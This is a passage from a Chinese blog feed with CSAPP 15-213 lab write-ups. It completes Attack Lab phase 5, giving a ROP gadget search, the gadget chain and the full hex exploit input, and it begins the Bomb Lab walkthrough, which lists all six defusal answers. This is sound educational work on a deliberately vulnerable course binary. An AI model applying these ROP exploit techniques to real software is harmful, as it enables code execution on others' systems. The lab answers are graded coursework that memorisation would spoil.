<code>gadget</code>  吗？于是我查找了<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">一点资料</span> (有点耍赖了对不起对不起～)，这个资料中提到的一条信息是我没有想到的：</p>\n<blockquote>\n<p>rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在 <code>test</code>  函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。</p>\n</blockquote>\n<p>因此，我们应该做的步骤是：</p>\n<pre><code>1. 将攻击字符串放在%rsp + offset 处\n2. 让 %rdi = %rsp + offset\n3. ret\n</code></pre>\n<p>那么如何计算这个地址，并且将其赋给 <code>%rdi</code>  呢？这个地址的计算需要在 <code>%rsp</code>  的基础上偏移几十个字节。地址的计算我们可以使用 <code>lea</code>  指令，然而加法运算如何实现呢？我们看看代码中有没有提供：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Add two arguments */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token function\">add_xy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span>y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这段代码的汇编格式如下：</p>\n<pre><code>00000000004019d6 &lt;add_xy&gt;:\n  4019d6:\t48 8d 04 37          \tlea    (%rdi,%rsi,1),%rax\n  4019da:\tc3                   \tretq\n</code></pre>\n<p>其把 <code>%rdi</code>  和 <code>%rsi</code>  累加到 <code>%rax</code>  中，那么我们要计算偏移量，需要分别把 <code>%rsp</code>  和偏移量放到 <code>%rsi</code>  和 <code>%rdi</code>  中。最后让 <code>%rdi = rax</code> 。</p>\n<p>在 <code>rtarget</code>  中，与 <code>%rsp</code>  相关的字节有 <code>48 89 e0</code> ，其编码为 <code>movq %rsp,%rax</code> 。和 <code>%esp</code>  相关的字节有 <code>89 e0</code> ，其编码为 <code>movl %esp, %eax</code> 。包含这段编码的代码如下：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n\n0000000000401a18 &lt;getval_345&gt;: // 不可取，c1不是单独指令\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n\n0000000000401a47 &lt;addval_201&gt;: // 不可取，c7不是单独指令\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n\n0000000000401a5a &lt;setval_299&gt;: // 不可取，91不是单独指令\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n\n0000000000401a97 &lt;setval_181&gt;: // 不可取，c2不是单独指令\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>那么之前的过程就变为：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rsi = 偏移量\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们找一下以 <code>%rsi</code>  和 <code>%rdi</code>  为目的寄存器的指令。</p>\n<p>以 <code>%rdi</code>  为目的寄存器的指令编码有 <code>(48)* 89 (c|d|e|f)(7|f)</code> ，在 <code>rtarget</code>  中可能的代码段如下：</p>\n<pre><code>00000000004019a0 &lt;addval_273&gt;: // 不可取，c3不是指令\n  4019a0:\t8d 87 48 89 c7 c3    \tlea    -0x3c3876b8(%rdi),%eax\n  4019a6:\tc3                   \tretq\n\n00000000004019ae &lt;setval_237&gt;: // 不可取，c7不是指令\n  4019ae:\tc7 07 48 89 c7 c7    \tmovl   $0xc7c78948,(%rdi)\n  4019b4:\tc3                   \tretq\n\n00000000004019c3 &lt;setval_426&gt;: // 是他！是他！就是他！\n  4019c3:\tc7 07 48 89 c7 90    \tmovl   $0x90c78948,(%rdi)\n  4019c9:\tc3                   \tretq\n</code></pre>\n<p>以 <code>%rsi/%esi</code>  为目的寄存器的指令编码有 <code>(48)* 89 (c|d|e|f)(6|e)</code> 。在 <code>rtarget</code>  中可能的代码段如下：</p>\n<pre><code>00000000004019e8 &lt;addval_113&gt;: // 不可取，78 c9不是指令\n  4019e8:\t8d 87 89 ce 78 c9    \tlea    -0x36873177(%rdi),%eax\n  4019ee:\tc3                   \tretq\n\n0000000000401a11 &lt;addval_436&gt;: // 可以是他！\n  401a11:\t8d 87 89 ce 90 90    \tlea    -0x6f6f3177(%rdi),%eax\n  401a17:\tc3                   \tretq\n\n0000000000401a25 &lt;addval_187&gt;: // 可以是他，38 c0 是cmpb %al指令，不影响结果\n  401a25:\t8d 87 89 ce 38 c0    \tlea    -0x3fc73177(%rdi),%eax\n  401a2b:\tc3                   \tretq\n\n0000000000401a61 &lt;addval_404&gt;: // 不可取，92 c3不是指令\n  401a61:\t8d 87 89 ce 92 c3    \tlea    -0x3c6d3177(%rdi),%eax\n  401a67:\tc3                   \tretq\n</code></pre>\n<p>这里没有 <code>48</code> ，那么就只能输送到 <code>%esi</code>  中。这里的难点在于如何把偏移量输送到 <code>%esi</code>  中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了 <code>89 ce</code> ，通过查表我们可以发现 <code>89 ce</code>  对应的指令是 <code>movl %ecx, %esi</code> 。那么我们还需要想办法把值送到 <code>%ecx</code>  中。那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. ecx = 偏移量； rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为 <code>%ecx</code>  的相关指令，其格式为 <code>(48)* 89 (c|d|e|f)(1|9)</code> ，包含其格式的代码段为：</p>\n<pre><code>00000000004019f6 &lt;getval_226&gt;: // 不可取，48 c0不是指令\n  4019f6:\tb8 89 d1 48 c0       \tmov    $0xc048d189,%eax\n  4019fb:\tc3                   \tretq\n0000000000401a33 &lt;getval_159&gt;: // 可取，38 c9 是cmpb %cl指令\n  401a33:\tb8 89 d1 38 c9       \tmov    $0xc938d189,%eax\n  401a38:\tc3                   \tretq\n0000000000401a68 &lt;getval_311&gt;: // 可取，08 db 是orb %bl指令\n  401a68:\tb8 89 d1 08 db       \tmov    $0xdb08d189,%eax\n  401a6d:\tc3                   \tretq\n0000000000401a6e &lt;setval_167&gt;: // 不可取，91 c3 不是指令\n  401a6e:\tc7 07 89 d1 91 c3    \tmovl   $0xc391d189,(%rdi)\n  401a74:\tc3                   \tretq\n</code></pre>\n<p>代码段中以 <code>%ecx</code>  为目的寄存器的代码格式为 <code>89 d1</code> ，其转化为指令为 <code>movl %edx, %ecx</code> 。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. edx = 偏移量； ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为 <code>%edx</code>  的相关指令，其格式为 <code>(48)* 89 (c|d|e|f)(2|a)</code> ，包含其格式的代码段为：</p>\n<pre><code>00000000004019db &lt;getval_481&gt;: // 可以是他！\n  4019db:\tb8 5c 89 c2 90       \tmov    $0x90c2895c,%eax\n  4019e0:\tc3                   \tretq\n0000000000401a1e &lt;addval_479&gt;: // 不可以是他！\n  401a1e:\t8d 87 89 c2 00 c9    \tlea    -0x36ff3d77(%rdi),%eax\n  401a24:\tc3                   \tretq\n0000000000401a40 &lt;addval_487&gt;: // 可以是他，84 c0是 testb %al\n  401a40:\t8d 87 89 c2 84 c0    \tlea    -0x3f7b3d77(%rdi),%eax\n  401a46:\tc3                   \tretq\n0000000000401a54 &lt;getval_155&gt;: // 不可以是他，c4 c9不是指令\n  401a54:\tb8 89 c2 c4 c9       \tmov    $0xc9c4c289,%eax\n  401a59:\tc3                   \tretq\n0000000000401a8a &lt;addval_124&gt;: // 不可以是他，c7 37不是指令\n  401a8a:\t8d 87 89 c2 c7 3c    \tlea    0x3cc7c289(%rdi),%eax\n  401a90:\tc3                   \tretq\n0000000000401a9e &lt;addval_184&gt;: // 不可以是他，60 d2不是指令\n  401a9e:\t8d 87 89 c2 60 d2    \tlea    -0x2d9f3d77(%rdi),%eax\n  401aa4:\tc3                   \tretq\n</code></pre>\n<p>代码段中以 <code>%edx</code>  为目的寄存器的代码格式为 <code>89 c2</code> ，其转化为指令为 <code>movl %eax, %edx</code> 。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. eax = 偏移量；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>以 <code>%eax</code>  (或 <code>%rax</code> ) 为目的寄存器的指令格式为 <code>(48)* 89 (c|d|e|f)(0|8)</code> ，包含其格式的代码段为：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n0000000000401a18 &lt;getval_345&gt;:\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n0000000000401a47 &lt;addval_201&gt;:\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n0000000000401a5a &lt;setval_299&gt;:\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n0000000000401a97 &lt;setval_181&gt;:\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>其中以 <code>%eax</code>  为目的寄存器的代码格式为 <code>89 e0</code> ，其主要目的为 <code>movl %esp,%eax</code> ，也就是我们步骤第一步中的内容。</p>\n<p>除此以外，还有一种涉及 <code>%rax</code>  的指令就是 <code>popq %rax</code> ，其指令编码为 <code>58</code> 。其在代码中出现的部分包含：</p>\n<pre><code>00000000004019a7 &lt;addval_219&gt;: // 可以是他！\n  4019a7:\t8d 87 51 73 58 90    \tlea    -0x6fa78caf(%rdi),%eax\n  4019ad:\tc3                   \tretq\n00000000004019b5 &lt;setval_424&gt;: // 92不是指令，不可以是他！\n  4019b5:\tc7 07 54 c2 58 92    \tmovl   $0x9258c254,(%rdi)\n  4019bb:\tc3                   \tretq\n00000000004019ca &lt;getval_280&gt;: // c3不是指令，不可以是他！\n  4019ca:\tb8 29 58 90 c3       \tmov    $0xc3905829,%eax\n  4019cf:\tc3                   \tretq\n</code></pre>\n<p>那么我们可以采取的方式是：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>但是现在问题来了， <code>%rax</code>  既要存储偏移量，又要存储 <code>%rsp</code> ，我们能否换个地方存储 <code>%rsp</code>  呢，其实可以把第 2 步和第 3 步换一下，让 <code>%rax</code>  转储到 <code>%rdi</code>  里去就行。最终步骤如下：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n3. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>其中 <code>gadget</code>  的地址为：(单独的 gadget 地址见前文)</p>\n<ol>\n<li><code>rax = rsp</code>  -&gt;  <code>401a06</code></li>\n<li><code>rdi = rax</code>  -&gt;  <code>4019c5</code></li>\n<li><code>popq %eax</code>  -&gt;  <code>4019ab</code></li>\n<li>偏移量存储在栈上</li>\n<li><code>edx = eax</code>  -&gt;  <code>4019dd</code></li>\n<li><code>ecx = edx</code>  -&gt;  <code>401a69</code></li>\n<li><code>rsi = ecx</code>  -&gt;  <code>401a13</code></li>\n<li><code>rax = rdi + rsi</code>  -&gt;  <code>4019d6</code></li>\n<li><code>rdi = rax</code>  -&gt;  <code>4019c5</code></li>\n<li><code>touch3</code>  地址 -&gt;  <code>4018fa</code></li>\n</ol>\n<p>因为在执行第一条 <code>rax = rsp</code>  时，已经执行了一次 <code>ret</code>  指令，因此此时 <code>%rsp</code>  在 <code>buf + 48</code>  处，也就是返回地址已经被弹出了一个。所以在 <code>buf + 48</code>  后面是 9 个地址 + 数据，因此偏移量应该是  <code>9 * 8 = 72</code> ，转化为 16 进制就是 <code>0x48</code> 。最终的栈结构如下：</p>\n<p><img data-src=\"phase5-last.png\" alt=\"phase5-last.png\"></p>\n<p>因此，phase 5 的输入为：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n06 1a 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nab 19 40 00 00 00 00 00\n48 00 00 00 00 00 00 00\ndd 19 40 00 00 00 00 00\n69 1a 40 00 00 00 00 00\n13 1a 40 00 00 00 00 00\nd6 19 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nfa 18 40 00 00 00 00 00\n35 39 62 39 39 37 66 61\n00\n</code></pre>\n<p>最终结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Type string:Touch3<span class=\"token operator\">!</span>: You called touch3<span class=\"token punctuation\">(</span><span class=\"token string\">\"59b997fa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Valid solution <span class=\"token keyword\">for</span> level <span class=\"token number\">3</span> with target rtarget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        result  <span class=\"token number\">1</span>:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A <span class=\"token number\">40</span> 00 00 00 00 00 C5 <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 AB <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 <span class=\"token number\">48</span> 00 00 00 00 00 00 00 DD <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 <span class=\"token number\">69</span> 1A <span class=\"token number\">40</span> 00 00 00 00 00 <span class=\"token number\">13</span> 1A <span class=\"token number\">40</span> 00 00 00 00 00 D6 <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 C5 <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 FA <span class=\"token number\">18</span> <span class=\"token number\">40</span> 00 00 00 00 00 <span class=\"token number\">35</span> <span class=\"token number\">39</span> <span class=\"token number\">62</span> <span class=\"token number\">39</span> <span class=\"token number\">39</span> <span class=\"token number\">37</span> <span class=\"token number\">66</span> <span class=\"token number\">61</span> 00</pre></td></tr></table></figure><p>通过！</p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可</li>\n<li>phase 2 需要让 <code>%rdi</code>  的值等于 <code>cookie</code>  的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点</li>\n<li>phase 3 中我们需要插入自己的攻击字符串，然后让 <code>ret</code>  指令返回到攻击代码开始处，通过指令将 <code>%rdi</code>  的值设置为攻击字符串的地址，并且把 <code>touch3</code>  的地址压到栈上。这里的难点在于 <code>hexmatch</code>  和 <code>strncmp</code>  中出现了 <code>push</code>  的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数 ( <code>test</code> ) 的栈空间内（在返回地址下面），然后让 <code>%rdi</code>  指向这里</li>\n<li>phase 4 &amp; phase 5 的难点在于将过程理清楚，并且在 <code>rtarget</code>  中找到对应的 <code>gadget</code> ，将栈上作为 <code>gadget</code>  地址和数值的组合，巧妙地运用 <code>popq</code>  和 <code>ret</code>  和其他指令组合出我们想要的操作。</li>\n<li>phase 5 的核心在于首先确定 <code>rax = rdi + rsi</code> ，并且这两个寄存器一个存储 <code>%rsp</code> ，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在 <code>rtarget</code>  中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！</li>\n</ol>\n<p>虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！</p>\n<h2 id=\"参考资料\"><a class=\"markdownIt-Anchor\" href=\"#参考资料\">#</a> 参考资料</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">CSAPP 实验之 attack lab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzYzOTY0NjU=\">CSAPP | Lab3-Attack Lab 深入解析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">csapp-attacklab 详解</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 2-Bomb lab 实验记录",
            "date_published": "2024-02-26T08:49:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>我看见网上非常多的教程里面是一边使用 <code>gdb</code>  调试（过程中可能引爆炸弹），一边探索结果的。他们可能多次启动了 <code>GDB</code>  来完成实验。但是我在 <code>bomb.c</code>  中看到了如下指示:</p>\n<pre><code>No VICTIM may debug, reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB.\n</code></pre>\n<p>并且在 CSAPP 3e 的 handout 中也写的很清楚，不应该多次启动 gdb 来通过输入随机序列的方式来探测密码，毕竟解引的机会只有一次。如果引爆炸弹，autolab 的分数会掉。所以正确的方法应该是对汇编程序进行逆向分析，然后推算炸弹的密码，而不是通过多次输入字符串来利用炸弹进行测试。</p>\n<p>不要一开始就开 <code>gdb</code>  运行 <code>phase</code> ，可以先启动 <code>gdb</code> ，在 <code>main</code>  函数部分打断点，因为很多地方需要从 <code>gdb</code>  中获取信息，但是我们又不能直接开始做题，因为一做题就无法二次启动 <code>gdb</code>  了（会扣实验分）。最好是把每个 <code>phase</code>  都分析透彻，得出确定的答案了，再在 <code>gdb</code>  中运行，因为中间没有空闲给你打断点和运行，直接进入 <code>gets</code>  输入了。</p>\n<p>6 道题的答案为（如果用文件输入的话，记得最后有个换行符，否则炸弹爆炸）：</p>\n<pre><code>Border relations with Canada have never been better.\n1 2 4 8 16 32\n0 207\n0 0 DrEvil\nIONEFG\n4 3 2 1 6 5\n20\n\n</code></pre>\n<h2 id=\"题目浏览\"><a class=\"markdownIt-Anchor\" href=\"#题目浏览\">#</a> 题目浏览</h2>\n<p>首先我们使用 <code>wget</code>  命令从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc2FwcC5jcy5jbXUuZWR1LzNlL2xhYnMuaHRtbA==\">实验官网</span>下载 <code>tar</code>  文件，使用 <code>tar xvf bomb.tar</code>  解压文件。</p>\n<p>打开文件夹，里面有 2 个重要文件，分别是 <code>bomb.c</code>  和 <code>bomb</code>  二进制文件。我们使用 <code>objdump -d bomb &gt; bomb.s</code>  生成二进制可执行文件的反汇编并存储在 <code>bomb.s</code>  中。 <code>bomb.c</code>  中只有 <code>main</code>  函数的部分， <code>main</code>  函数调用的那些函数只在二进制文件和汇编代码中存在。</p>\n<p>我们首先来看 <code>bomb.c</code> ，其中含有 6 个 phase 的炸弹，我们需要依次解开。在函数最开始处作者声明可以有多种输入格式，可以从 <code>stdin</code>  获取输入，也可以从文件获取输入。每个 phase 都有如下两行：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">phase_n</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">/* Run the phase               */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">phase_defused</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Drat!  They figured it out!</span></pre></td></tr></table></figure><h2 id=\"phase1-分析-基础读值\"><a class=\"markdownIt-Anchor\" href=\"#phase1-分析-基础读值\">#</a> phase1 分析：基础读值</h2>\n<p><code>phase_1</code>  的汇编代码如下：</p>\n<pre><code>0000000000400ee0 &lt;phase_1&gt;:\n  400ee0:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400ee4:\tbe 00 24 40 00       \tmov    $0x402400,%esi\n  400ee9:\te8 4a 04 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  400eee:\t85 c0                \ttest   %eax,%eax\n  400ef0:\t74 05                \tje     400ef7 &lt;phase_1+0x17&gt;\n  400ef2:\te8 43 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400ef7:\t48 83 c4 08          \tadd    $0x8,%rsp\n  400efb:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>留出 8 个字节的空间</li>\n<li>让 <code>%esi = 0x402400</code> ，</li>\n<li>调用 <code>strings_not_equal</code>  函数</li>\n<li>测试 <code>%eax</code>  是否等于 0</li>\n<li>若返回值为 0，则恢复栈帧，退出</li>\n<li>否则引爆炸弹</li>\n</ol>\n<p>这里推测 <code>%esi</code>  是给 <code>strings_not_equal</code>  提供的参数，且 <code>string_not_equal</code>  返回的是个 <code>int</code>  类型整数。</p>\n<p>我们打开 <code>gdb</code> ，打好断点并运行，输入 <code>call strings_not_equal(&quot;a&quot;,&quot;a&quot;)</code>  发现返回 0。输入 <code>call string_length(&quot;a&quot;)</code>  发现返回 1。那么 <code>strings_not_equal</code>  的作用就是判断两字符串是否不相等， <code>string_length</code>  的作用就是计算字符串的长度。</p>\n<p>我们的目的是让 <code>strings_not_equal</code>  返回 0，也就是说我们需要传入两个相同的字符串。那么问题在于我们传入的字符串存储在哪里呢？我们看一下 <code>strings_not_equal</code>  的反汇编代码：</p>\n<pre><code class=\"language-asm\">0000000000401338 &lt;strings_not_equal&gt;:\nseg1:\n  401338:\t41 54                \tpush   %r12\n  40133a:\t55                   \tpush   %rbp\n  40133b:\t53                   \tpush   %rbx\n  40133c:\t48 89 fb             \tmov    %rdi,%rbx\n  40133f:\t48 89 f5             \tmov    %rsi,%rbp\n  401342:\te8 d4 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401347:\t41 89 c4             \tmov    %eax,%r12d\n  40134a:\t48 89 ef             \tmov    %rbp,%rdi\n  40134d:\te8 c9 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401352:\tba 01 00 00 00       \tmov    $0x1,%edx\n\n  401357:\t41 39 c4             \tcmp    %eax,%r12d\n  40135a:\t75 3f                \tjne    40139b &lt;strings_not_equal+0x63&gt;\n  40135c:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40135f:\t84 c0                \ttest   %al,%al\n  401361:\t74 25                \tje     401388 &lt;strings_not_equal+0x50&gt;\n\n  401363:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  401366:\t74 0a                \tje     401372 &lt;strings_not_equal+0x3a&gt;\n  401368:\teb 25                \tjmp    40138f &lt;strings_not_equal+0x57&gt;\nseg2:\n  40136a:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  40136d:\t0f 1f 00             \tnopl   (%rax)\n  401370:\t75 24                \tjne    401396 &lt;strings_not_equal+0x5e&gt;\nseg3:\n  401372:\t48 83 c3 01          \tadd    $0x1,%rbx\n  401376:\t48 83 c5 01          \tadd    $0x1,%rbp\n  40137a:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40137d:\t84 c0                \ttest   %al,%al\n  40137f:\t75 e9                \tjne    40136a &lt;strings_not_equal+0x32&gt;\n  401381:\tba 00 00 00 00       \tmov    $0x0,%edx\n  401386:\teb 13                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg4:\n  401388:\tba 00 00 00 00       \tmov    $0x0,%edx\n  40138d:\teb 0c                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg5:\n  40138f:\tba 01 00 00 00       \tmov    $0x1,%edx\n  401394:\teb 05                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg6:\n  401396:\tba 01 00 00 00       \tmov    $0x1,%edx\nseg7:\n  40139b:\t89 d0                \tmov    %edx,%eax\n  40139d:\t5b                   \tpop    %rbx\n  40139e:\t5d                   \tpop    %rbp\n  40139f:\t41 5c                \tpop    %r12\n  4013a1:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言代码分析如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">seg2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>al <span class=\"token operator\">!=</span> <span class=\"token operator\">*</span>rbp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token 